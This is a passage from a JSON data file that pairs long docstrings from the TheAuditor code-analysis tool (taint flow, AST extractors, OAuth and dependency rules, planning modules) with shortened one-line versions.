    "original_lines": 15,
    "original": "\"\"\"Complete flow resolution engine for codebase truth generation.\n\nThis module implements forward flow analysis to populate the resolved_flow_audit table\nwith ALL control flows in the codebase, not just vulnerable ones. This transforms\nTheAuditor from a security scanner to a complete codebase resolution engine where\nthe database becomes the queryable truth for AI agents.\n\nArchitecture:\n    - Forward DFS traversal from ALL entry points to ALL exit points (memory-efficient)\n    - Records complete provenance (hop chains) for every flow\n    - Classifies flows as SAFE or TRUNCATED only (security rules applied later)\n    - Populates resolved_flow_audit table with >100,000 resolved flows\n    - Uses graph node IDs: file::function::variable (matches dfg_builder.py)\n    - Memory optimized: No redundant visited sets, DFS stack instead of BFS queue\n\"\"\"",
    "truncated": "\"\"\"Complete flow resolution engine for codebase truth generation.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Check if a node represents a true entry point (HTTP request data).\n\n        True entry points are where user data enters the backend:\n        - Express/Flask/Django request objects (req.body, request.args, etc.)\n        - Environment variables (process.env.X)\n        - Command line arguments (process.argv)\n\n        This prevents false positives from local variable names like 'query' or 'data'.\n\n        Args:\n            node_id: Node ID in format file::function::variable\n\n        Returns:\n            True if this is a real entry point, False otherwise\n        \"\"\"",
    "truncated": "\"\"\"Check if a node represents a true entry point (HTTP request data).\"\"\""
  },
  {
    "file": "theauditor/venv_install.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n    Self-update package.json with latest versions from npm registry.\n\n    Uses the modern async batch engine from deps.py for efficient parallel fetching.\n\n    This function is called BEFORE npm install to ensure we always\n    get the latest versions of our tools, solving the paradox of\n    needing to update dependencies that are in excluded directories.\n\n    Args:\n        package_json_path: Path to the package.json file to update\n\n    Returns:\n        Number of packages updated\n    \"\"\"",
    "truncated": "\"\"\"Self-update package.json with latest versions from npm registry.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/advanced_extractors.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Extract namespace package patterns (pkgutil.extend_path usage).\n\n    Detects:\n    - pkgutil.extend_path() calls\n    - __path__ manipulation for namespace packages\n\n    Returns:\n        List of namespace package dicts:\n        {\n            'line': int,\n            'pattern': str,  # 'extend_path' | 'path_manipulation'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract namespace package patterns (pkgutil.extend_path usage).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Extract decorator usage from Python AST.\n\n    Extracts all decorator patterns:\n    - Built-in: @property, @staticmethod, @classmethod, @abstractmethod\n    - Framework: @app.route, @task, @pytest.fixture, etc.\n    - Custom: Any @decorator_name pattern\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of decorator records\n    \"\"\"",
    "truncated": "\"\"\"Extract decorator usage from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Extract context manager usage from Python AST.\n\n    Extracts:\n    - with statements (with open(...) as f:)\n    - async with statements\n    - Custom context manager classes (__enter__/__exit__ methods)\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of context manager records\n    \"\"\"",
    "truncated": "\"\"\"Extract context manager usage from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Extract Flask request/response hooks.\n\n    Detects:\n    - @app.before_request\n    - @app.after_request\n    - @app.teardown_request\n    - @app.before_first_request\n    - @app.teardown_appcontext\n\n    Security relevance:\n    - before_request = authentication/authorization checkpoint\n    - after_request = response header injection point\n    - Missing auth in before_request = bypass risk\n    \"\"\"",
    "truncated": "\"\"\"Extract Flask request/response hooks.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Extract Celery Beat periodic task schedules.\n\n    Detects:\n    - app.conf.beat_schedule = {...} dictionary assignments\n    - crontab() expressions (minute, hour, day_of_week, day_of_month, month_of_year)\n    - schedule() interval expressions (run_every seconds)\n    - @periodic_task decorator (deprecated)\n    - Task references and arguments in schedules\n\n    Security relevance:\n    - Scheduled admin tasks running automatically\n    - Overfrequent schedules (DoS risk)\n    - Sensitive data operations (backups, cleanups)\n    \"\"\"",
    "truncated": "\"\"\"Extract Celery Beat periodic task schedules.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/testing_extractors.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Extract pytest plugin hooks from conftest.py.\n\n    Detects:\n    - pytest_configure\n    - pytest_collection_modifyitems\n    - pytest_addoption\n    - pytest_runtest_* hooks\n    - Custom fixtures in conftest.py\n\n    Security relevance:\n    - Plugin hooks = test infrastructure\n    - Malicious conftest.py = test manipulation\n    - Custom collection = test selection bias\n    \"\"\"",
    "truncated": "\"\"\"Extract pytest plugin hooks from conftest.py.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/validation_extractors.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Extract Django REST Framework serializer definitions.\n\n    Detects:\n    - Serializer class definitions (inherit from serializers.Serializer or serializers.ModelSerializer)\n    - Field count (validation surface area)\n    - ModelSerializer detection (has Meta.model)\n    - read_only_fields in Meta\n    - Custom validators (validate_<field> methods)\n\n    Security relevance:\n    - Serializers without validators = incomplete input validation\n    - Missing read_only_fields = mass assignment vulnerabilities\n    - ModelSerializer without field restrictions = over-exposure (parity with Express/Prisma)\n    \"\"\"",
    "truncated": "\"\"\"Extract Django REST Framework serializer definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Extract return expressions (both explicit and implicit).\n\n    Rust has two types of returns:\n    1. Explicit: return x;\n    2. Implicit: last expression without semicolon\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of return dicts with function_name, return_expr, line\n    \"\"\"",
    "truncated": "\"\"\"Extract return expressions (both explicit and implicit).\"\"\""
  },
  {
    "file": "theauditor/ast_parser.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Parse in-memory content into AST.\n\n        Why: parse_file() reads from disk, but universal_detector already has content.\n        This provides memory-based parsing with same infrastructure for both languages.\n\n        Args:\n            content: Source code as string\n            language: Programming language ('python' or 'javascript')\n            filepath: Original file path for error messages\n            jsx_mode: JSX extraction mode ('preserved' or 'transformed')\n\n        Returns:\n            Dictionary with parsed AST or None if parsing fails\n        \"\"\"",
    "truncated": "\"\"\"Parse in-memory content into AST.\"\"\""
  },
  {
    "file": "theauditor/config_runtime.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Load runtime configuration from .pf/config.json and environment variables.\n\n    Config priority (highest to lowest):\n    1. Environment variables (THEAUDITOR_* prefixed)\n    2. .pf/config.json file\n    3. Built-in defaults\n\n    Args:\n        root: Root directory to look for config file\n\n    Returns:\n        Configuration dictionary with merged values\n    \"\"\"",
    "truncated": "\"\"\"Load runtime configuration from .pf/config.json and environment variables.\"\"\""
  },
  {
    "file": "theauditor/context/formatters.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Convert dataclass to dict recursively.\n\n    Handles:\n    - Dataclasses (convert with asdict)\n    - Lists (recurse on each item)\n    - Dicts (recurse on values)\n    - Other types (return as-is)\n\n    Args:\n        obj: Object to convert\n\n    Returns:\n        Dict representation suitable for JSON serialization\n    \"\"\"",
    "truncated": "\"\"\"Convert dataclass to dict recursively.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Get framework-specific information for a file.\n\n        Auto-detects framework from file extension and queries appropriate tables:\n        - React/Vue: components, hooks\n        - Express: middleware, routes\n        - Flask/FastAPI: routes, decorators\n        - Sequelize/SQLAlchemy: models, relationships\n\n        Args:\n            file_path: File path (partial match)\n\n        Returns:\n            Dict with framework name and relevant data\n        \"\"\"",
    "truncated": "\"\"\"Get framework-specific information for a file.\"\"\""
  },
  {
    "file": "theauditor/fce.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Load graph analysis data (hotspots and cycles) from database.\n\n    Queries findings_consolidated for graph-analysis findings using typed columns\n    (graph_id, graph_score, graph_centrality, etc.) - NO JSON parsing.\n\n    Args:\n        db_path: Path to repo_index.db database\n\n    Returns:\n        Tuple of (hotspot_files dict, cycles list)\n        - hotspot_files: {file_path: hotspot_data} for O(1) lookup\n        - cycles: List of cycle dicts with nodes and size\n    \"\"\"",
    "truncated": "\"\"\"Load graph analysis data (hotspots and cycles) from database.\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n        Find shortest path between two nodes using BFS with deque.\n\n        Pure pathfinding algorithm without interpretation. Uses deque\n        for O(1) queue operations instead of O(N) list.pop(0).\n\n        Args:\n            source: Source node ID\n            target: Target node ID\n            graph: Graph with edges\n\n        Returns:\n            List of node IDs forming the path, or None if no path exists\n        \"\"\"",
    "truncated": "\"\"\"Find shortest path between two nodes using BFS with deque.\"\"\""
  },
  {
    "file": "theauditor/graph/db_cache.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Get all imports for a file (O(1) lookup).\n\n        Args:\n            file_path: File path (Windows or Unix format - auto-normalized)\n\n        Returns:\n            List of import dicts (kind, value, line) or empty list if none\n\n        Example:\n            >>> cache.get_imports(\"theauditor\\\\main.py\")  # Windows\n            [{\"kind\": \"from\", \"value\": \"theauditor/cli.py\", \"line\": 5}]\n            >>> cache.get_imports(\"theauditor/main.py\")   # Unix\n            [{\"kind\": \"from\", \"value\": \"theauditor/cli.py\", \"line\": 5}]\n        \"\"\"",
    "truncated": "\"\"\"Get all imports for a file (O(1) lookup).\"\"\""
  },
  {
    "file": "theauditor/graph/path_correlator.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Find execution paths containing multiple findings with path conditions.\n\n        ADAPTIVE STRATEGY (v1.3+):\n        - Below complexity threshold (≤25 finding locations): High-precision O(N²) pathfinding\n        - Above threshold (>25): Fast O(N) block clustering to prevent performance cliff\n\n        ALGORITHMIC IMPROVEMENT (v1.1+):\n        Instead of enumerating all paths (which causes false negatives when max_paths\n        is reached), we use targeted graph traversal. For each pair of findings, we\n        check if a path exists between them using BFS. This guarantees complete\n        accuracy regardless of function complexity.\n\n        Reports factual control flow conditions, not interpretations.\n        \"\"\"",
    "truncated": "\"\"\"Find execution paths containing multiple findings with path conditions.\"\"\""
  },
  {
    "file": "theauditor/graph/path_correlator.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n        O(N) clustering strategy for complex functions.\n\n        Groups findings that share the exact same Basic Block. This is an\n        ADAPTIVE ALGORITHM SELECTION (not a fallback) - chosen when function\n        complexity makes O(N²) pathfinding too expensive.\n\n        Args:\n            findings_to_blocks: Dict mapping block_id -> list of findings\n\n        Returns:\n            List of block_cluster dicts with explicit metadata distinguishing\n            this from high-precision path_cluster results\n        \"\"\"",
    "truncated": "\"\"\"O(N) clustering strategy for complex functions.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Add a GraphQL field argument definition record to the batch.\n\n        Args:\n            field_id: FK to graphql_fields.field_id (from INSERT return)\n            arg_name: Argument name (e.g., 'id', 'limit', 'filter')\n            arg_type: GraphQL argument type (e.g., 'ID!', 'Int', 'UserInput')\n            has_default: Whether argument has a default value\n            default_value: Default value as string (optional)\n            is_nullable: Whether argument is nullable\n\n        Note: Directives go to junction table graphql_arg_directives (via add_graphql_arg_directive)\n\n        NO FALLBACKS. field_id MUST exist from prior add_graphql_field call.\n        \"\"\"",
    "truncated": "\"\"\"Add a GraphQL field argument definition record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Add a GraphQL resolver parameter mapping record to the batch.\n\n        Maps GraphQL argument names to function parameter positions for taint analysis.\n\n        Args:\n            resolver_symbol_id: FK to symbols.symbol_id (resolver function)\n            arg_name: GraphQL argument name from schema (e.g., 'userId')\n            param_name: Function parameter name in code (e.g., 'user_id', 'args')\n            param_index: Parameter position in function signature (0-indexed)\n            is_kwargs: True if parameter is part of kwargs dict (Python) or destructured object (JS)\n            is_list_input: True if parameter expects list/array input\n\n        NO FALLBACKS. resolver_symbol_id MUST exist from prior add_graphql_resolver_mapping call.\n        \"\"\"",
    "truncated": "\"\"\"Add a GraphQL resolver parameter mapping record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Add a class property declaration record to the batch.\n\n        Args:\n            file: File containing the class\n            line: Line number of property declaration\n            class_name: Name of the containing class\n            property_name: Name of the property\n            property_type: TypeScript type annotation (e.g., \"string\", \"number | null\")\n            is_optional: Whether property has ? modifier\n            is_readonly: Whether property has readonly keyword\n            access_modifier: \"private\", \"protected\", or \"public\" (None = public by default)\n            has_declare: Whether property has declare keyword (TypeScript ambient declaration)\n            initializer: Default value expression if present\n        \"\"\"",
    "truncated": "\"\"\"Add a class property declaration record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Add a Python test fixture - returns row ID for junction table FK.\n\n        CRITICAL: Uses direct cursor.execute() to return lastrowid for junction FK.\n        DO NOT USE BATCHING - junction tables need parent ID.\n\n        Args:\n            fixture_kind: Discriminator: 'fixture', 'parametrize', 'marker', 'mock',\n                         'plugin_hook', 'hypothesis'\n            fixture_type: Extractor's subtype (preserved)\n            scope: 'function', 'class', 'module', 'session'\n\n        Returns:\n            int: Row ID of inserted fixture (for python_fixture_params FK)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python test fixture - returns row ID for junction table FK.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Add a Python framework configuration - returns row ID for junction table FK.\n\n        CRITICAL: Uses direct cursor.execute() to return lastrowid for junction FK.\n        DO NOT USE BATCHING - junction tables need parent ID.\n\n        Args:\n            config_kind: Discriminator: 'app', 'extension', 'hook', 'error_handler', 'task',\n                        'signal', 'admin', 'form', 'middleware', 'blueprint', 'resolver', etc.\n            config_type: Extractor's subtype (preserved)\n            framework: 'flask', 'celery', 'django', 'graphene', 'ariadne', 'strawberry'\n\n        Returns:\n            int: Row ID of inserted config (for python_framework_methods FK)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python framework configuration - returns row ID for junction table FK.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Extract SQL object definitions from .sql files.\n\n        This method detects DDL statements (CREATE TABLE, CREATE INDEX, etc.)\n        in actual SQL files, not code files.\n\n        For SQL queries embedded in code (Python, JavaScript), language extractors\n        should use AST-based extraction to find db.execute() calls.\n\n        Args:\n            content: SQL file content\n\n        Returns:\n            List of (kind, name) tuples\n        \"\"\"",
    "truncated": "\"\"\"Extract SQL object definitions from .sql files.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Determine extraction source category for SQL query.\n\n        This categorization allows rules to filter intelligently:\n        - migration_file: DDL from migration files (LOW priority for SQL injection)\n        - orm_query: ORM method calls (MEDIUM priority, usually parameterized)\n        - code_execute: Direct database execution (HIGH priority for injection)\n\n        Args:\n            file_path: Path to the file being analyzed\n            method_name: Database method name (execute, query, findAll, etc.)\n\n        Returns:\n            extraction_source category string\n        \"\"\"",
    "truncated": "\"\"\"Determine extraction source category for SQL query.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript_resolvers.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Resolve router mount hierarchy to populate api_endpoints.full_path.\n\n        ADDED 2025-11-09: Phase 6.7 - AST-based route resolution\n\n        Algorithm:\n        1. Load router_mounts table (router.use() statements from AST)\n        2. Resolve mount path expressions (API_PREFIX -> '/api/v1')\n        3. Resolve router variables to file paths (areaRoutes -> './area.routes' -> 'backend/src/routes/area.routes.ts')\n        4. Build 2-level mount hierarchy\n        5. Update api_endpoints.full_path = mount_path + pattern\n\n        Args:\n            db_path: Path to repo_index.db database\n        \"\"\"",
    "truncated": "\"\"\"Resolve router mount hierarchy to populate api_endpoints.full_path.\"\"\""
  },
  {
    "file": "theauditor/indexer/fidelity.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Data Fidelity Control System.\n\nEnforces the ZERO FALLBACK POLICY by reconciling extraction manifests\nagainst storage receipts. If data is extracted but not stored, this module\ntriggers a loud crash to prevent silent data loss.\n\nARCHITECTURE:\n    Extractor -> Manifest (what was found)\n    Storage   -> Receipt (what was saved)\n    Fidelity  -> Compare and CRASH if mismatch\n\nThis system was added after discovering ~22MB of silent data loss when\nschema columns were invented without verifying actual extractor outputs.\n\"\"\"",
    "truncated": "\"\"\"Data Fidelity Control System.\"\"\""
  },
  {
    "file": "theauditor/indexer/metadata_collector.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Collect git churn metrics for all files.\n\n        Returns pure facts:\n        - commits_90d: Number of commits in last N days (mathematical count)\n        - days_since_modified: Days since last modification (mathematical difference)\n        - unique_authors: Number of distinct authors (mathematical count)\n\n        Args:\n            days: Number of days to analyze (default 90)\n            output_path: Optional path to save JSON output\n\n        Returns:\n            Dictionary with churn metrics per file\n        \"\"\"",
    "truncated": "\"\"\"Collect git churn metrics for all files.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/infrastructure_schema.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\nInfrastructure-as-Code schema definitions.\n\nThis module contains table schemas specific to infrastructure tools:\n- Docker (containers, images, compose services)\n- NGINX (web server configuration)\n- Terraform (IaC resources, variables, outputs)\n- AWS CDK (Infrastructure as Code with Python/TypeScript)\n\nDesign Philosophy:\n- Infrastructure-only tables\n- Multi-cloud support (AWS, Azure, GCP via Terraform)\n- Security-focused (public exposure, misconfigurations)\n\"\"\"",
    "truncated": "\"\"\"Infrastructure-as-Code schema definitions.\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n        Calculate interpreted impact ratio for change analysis.\n\n        This is a SUBJECTIVE metric that interprets the scope of impact\n        as a ratio of total system size.\n\n        Args:\n            targets: Original target nodes\n            all_impacted: All impacted nodes (targets + upstream + downstream)\n            total_nodes: Total number of nodes in graph\n\n        Returns:\n            Impact ratio [0, 1]\n        \"\"\"",
    "truncated": "\"\"\"Calculate interpreted impact ratio for change analysis.\"\"\""
  },
  {
    "file": "theauditor/insights/impact_analyzer.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Find all symbols that call the target symbol (upstream dependencies).\n\n    Optimized: Uses a single JOIN query instead of N+1 queries.\n\n    Args:\n        cursor: Database cursor\n        target_file: File containing the target symbol\n        target_name: Name of the target symbol\n        target_type: Type of the target symbol (function/class)\n\n    Returns:\n        List of upstream dependency dictionaries\n    \"\"\"",
    "truncated": "\"\"\"Find all symbols that call the target symbol (upstream dependencies).\"\"\""
  },
  {
    "file": "theauditor/insights/impact_analyzer.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Find all symbols called by the target symbol (downstream dependencies).\n\n    Optimized: Uses batch WHERE IN query instead of N+1 queries.\n\n    Args:\n        cursor: Database cursor\n        target_file: File containing the target symbol\n        target_line: Line where target symbol is defined\n        target_name: Name of the target symbol\n\n    Returns:\n        List of downstream dependency dictionaries\n    \"\"\"",
    "truncated": "\"\"\"Find all symbols called by the target symbol (downstream dependencies).\"\"\""
  },
  {
    "file": "theauditor/insights/impact_analyzer.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Format impact analysis for planning agent consumption.\n\n    Outputs structured format with:\n    - Risk categories (production/tests/config/external)\n    - Coupling score\n    - Suggested phases for incremental changes\n\n    Args:\n        impact_data: Results from analyze_impact\n\n    Returns:\n        Planning-friendly formatted string\n    \"\"\"",
    "truncated": "\"\"\"Format impact analysis for planning agent consumption.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/__init__.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"ML module for TheAuditor - Clean architecture.\n\nPublic API:\n- learn(): Train ML models from historical data\n- suggest(): Generate predictions for workset files\n- check_ml_available(): Check if ML dependencies are installed\n\nInternal modules (exported for backwards compatibility):\n- loaders: Historical data loading\n- features: Database feature extraction\n- intelligence: Smart parsing (journal + raw artifacts)\n- models: Model operations\n- cli: CLI orchestration\n\"\"\"",
    "truncated": "\"\"\"ML module for TheAuditor - Clean architecture.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Parse raw/taint_analysis.json for detailed vulnerability data.\n\n    Returns dict mapping file paths to vulnerability details:\n    {\n        \"auth.py\": {\n            \"vulnerability_paths\": 3,\n            \"critical_count\": 2,\n            \"high_count\": 1,\n            \"cwe_list\": [\"CWE-89\", \"CWE-79\"],\n            \"max_taint_path_length\": 5\n        }\n    }\n    \"\"\"",
    "truncated": "\"\"\"Parse raw/taint_analysis.json for detailed vulnerability data.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"\n    Parse ALL raw/*.json files and combine into unified feature dict.\n\n    Returns dict with all parsed artifact categories:\n    {\n        \"taint\": {...},\n        \"vulnerabilities\": {...},\n        \"patterns\": {...},\n        \"fce\": {...},\n        \"cfg\": {...},\n        \"frameworks\": {...},\n        \"graph_metrics\": {...}\n    }\n    \"\"\"",
    "truncated": "\"\"\"Parse ALL raw/*.json files and combine into unified feature dict.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Intelligent parsers for raw artifacts and structured events.\n\nThis module provides THE MISSING 90% of ML intelligence:\n- Tier 1: Pipeline.log parsing (macro phase timing)\n- Tier 2: Enhanced journal parsing (ALL event types, not just apply_patch)\n- Tier 3: Raw/*.json parsing (ground truth findings from all tools)\n- Tier 4: Git analysis (churn, authors, workflows, worktrees)\n\nFIXES:\n- Old journal parser only looked at apply_patch (10% of data)\n- Raw directory completely ignored except graph_metrics.json\n- Phase differentiation non-existent (all 26 phases treated the same)\n- Git analysis limited to commit counts (missing authors, recency, workflow data)\n\"\"\"",
    "truncated": "\"\"\"Intelligent parsers for raw artifacts and structured events.\"\"\""
  },
  {
    "file": "theauditor/module_resolver.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Implement Node.js module resolution algorithm.\n\n        Follows Node.js rules:\n        1. Check relative paths\n        2. Check node_modules in current and parent directories\n        3. Check global modules\n\n        Args:\n            import_path: The module to resolve\n            containing_file: The file containing the import\n\n        Returns:\n            Resolved path or None if not found\n        \"\"\"",
    "truncated": "\"\"\"Implement Node.js module resolution algorithm.\"\"\""
  },
  {
    "file": "theauditor/pipelines.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Execute a chain of commands silently (no console output).\n\n    This is the modern replacement for run_command_chain().\n    No status files on disk - state is in memory.\n    NO PRINT STATEMENTS - completely silent execution.\n\n    Args:\n        commands: List of (description, command_array) tuples\n        root: Working directory\n        chain_name: Name of this chain (for result labeling)\n\n    Returns:\n        List of PhaseResult for each executed command\n    \"\"\"",
    "truncated": "\"\"\"Execute a chain of commands silently (no console output).\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Add task to plan and return task ID.\n\n        Args:\n            plan_id: ID of plan to add task to\n            title: Task title (required)\n            description: Task description\n            spec_yaml: Optional YAML spec for verification\n            assigned_to: Optional assignee\n\n        Returns:\n            task_id: ID of created task\n\n        NO FALLBACKS. Raises sqlite3.IntegrityError if plan_id invalid.\n        \"\"\"",
    "truncated": "\"\"\"Add task to plan and return task ID.\"\"\""
  },
  {
    "file": "theauditor/planning/shadow_git.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Shadow Git Manager.\n\nManages an isolated, bare git repository in .pf/snapshots.git.\nUsed for tracking incremental AI edits without polluting the user's\nactual git history.\n\nArchitecture:\n    - Creates a BARE repository (no working tree, just object database)\n    - User's .git folder is NEVER touched\n    - All snapshots stored in .pf/snapshots.git\n    - Provides O(1) tree-based diffing via libgit2\n\nNO FALLBACKS. Hard failure if pygit2 operations fail.\n\"\"\"",
    "truncated": "\"\"\"Shadow Git Manager.\"\"\""
  },
  {
    "file": "theauditor/planning/snapshots.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"DEPRECATED: Load a snapshot from the database.\n\n    Use PlanningManager.get_snapshot() instead.\n\n    Args:\n        snapshot_id: Snapshot ID to load\n        manager: PlanningManager instance\n\n    Returns:\n        Dict with snapshot data or None if not found\n\n    .. deprecated:: 1.6.5\n        Use :meth:`PlanningManager.get_snapshot` instead.\n    \"\"\"",
    "truncated": "\"\"\"DEPRECATED: Load a snapshot from the database.\"\"\""
  },
  {
    "file": "theauditor/refactor/profiles.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Load profile from a YAML string (no temp file needed).\n\n        This is the preferred method when you already have the YAML content\n        in memory, avoiding unnecessary disk I/O.\n\n        Args:\n            yaml_text: YAML specification text\n\n        Returns:\n            RefactorProfile instance\n\n        Raises:\n            ValueError: If YAML is malformed or missing required fields\n        \"\"\"",
    "truncated": "\"\"\"Load profile from a YAML string (no temp file needed).\"\"\""
  },
  {
    "file": "theauditor/rules/auth/oauth_analyze.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Detect OAuth flows without state parameter.\n\n    The state parameter prevents CSRF attacks in OAuth flows by:\n    - Binding the authorization request to the user's session\n    - Preventing attackers from injecting malicious authorization codes\n\n    Without state, attackers can:\n    1. Start OAuth flow for victim's account\n    2. Capture authorization code\n    3. Inject code into victim's session\n    4. Gain access to victim's account\n\n    CWE-352: Cross-Site Request Forgery (CSRF)\n    \"\"\"",
    "truncated": "\"\"\"Detect OAuth flows without state parameter.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/oauth_analyze.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Detect OAuth redirect URI validation issues.\n\n    Open redirect vulnerabilities in OAuth callbacks allow attackers to:\n    - Steal authorization codes by redirecting to attacker-controlled domains\n    - Phish users by appearing to come from legitimate domain\n\n    Proper validation should:\n    - Whitelist exact redirect URIs\n    - Validate against registered URIs\n    - Not use regex with loose patterns\n    - Check protocol, domain, and path\n\n    CWE-601: URL Redirection to Untrusted Site\n    \"\"\"",
    "truncated": "\"\"\"Detect OAuth redirect URI validation issues.\"\"\""
  },
  {
    "file": "theauditor/rules/common/__init__.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Common utility functions for security rules.\n\nThis package provides computational utilities used across security rules:\n- Entropy calculation (Shannon entropy for randomness measurement)\n- Pattern detection (sequential, keyboard walks, repetitive patterns)\n- Encoding validation (Base64 decoding and verification)\n- Test value detection (placeholder/test string identification)\n\nThese are UTILITY functions, not security rules. They provide pure\ncomputational analysis without database access.\n\nModule Type: Utility Package\nUsage: from theauditor.rules.common.util import calculate_entropy\n\"\"\"",
    "truncated": "\"\"\"Common utility functions for security rules.\"\"\""
  },
  {
    "file": "theauditor/rules/common/util.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Check if string follows a sequential pattern.\n\n        Examples:\n        - \"abcdef\" -> True (incrementing)\n        - \"987654\" -> True (decrementing)\n        - \"zyxwvu\" -> True (decrementing)\n        - \"abc123\" -> False (mixed)\n\n        Args:\n            text: String to analyze\n\n        Returns:\n            True if text follows consistent sequential pattern\n        \"\"\"",
    "truncated": "\"\"\"Check if string follows a sequential pattern.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/dependency_bloat.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Detect excessive dependencies (dependency bloat).\n\nToo many dependencies increase security surface area, build times, and\nmaintenance burden. This rule flags projects with excessive direct\ndependencies.\n\nDetection Strategy:\n1. Query package_configs and count dependencies\n2. Compare against DependencyThresholds from config.py\n3. Flag if counts exceed thresholds\n\nDatabase Tables Used:\n- package_configs: Dependency declarations\n\"\"\"",
    "truncated": "\"\"\"Detect excessive dependencies (dependency bloat).\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/peer_conflicts.py",
    "line": -1,
    "original_lines": 14,
    "original": "\"\"\"Detect peer dependency mismatches (database-first implementation).\n\nThis rule detects when declared peer dependencies don't match actual installed versions\nby checking the package_configs table. It doesn't require lock file parsing.\n\nDetection Strategy:\n1. Query peer_dependencies from package_configs\n2. Query actual installed versions from same table\n3. Check if peer requirements are satisfied\n4. Flag mismatches (e.g., package requires React ^17 but project has React 18)\n\nDatabase Tables Used:\n- package_configs: Peer dependency declarations and actual versions\n\"\"\"",
    "truncated": "\"\"\"Detect peer dependency mismatches (database-first implementation).\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/suspicious_versions.py",
    "line": -1,
    "original_lines": 14,
